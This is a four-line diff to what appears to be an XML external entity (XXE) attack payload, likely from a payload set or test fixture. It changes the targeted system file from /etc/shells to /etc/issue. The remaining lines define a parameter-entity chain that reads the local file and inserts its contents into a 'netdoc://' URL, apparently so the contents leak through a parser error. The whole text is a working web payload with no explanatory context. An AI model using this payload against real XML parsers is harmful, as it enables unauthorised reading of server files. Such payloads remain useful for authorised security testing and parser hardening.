@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/shells">
+<!ENTITY % file SYSTEM "file:///etc/issue">
 <!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'netdoc://nofile/%file;'>">
 %run;
 %exfil;
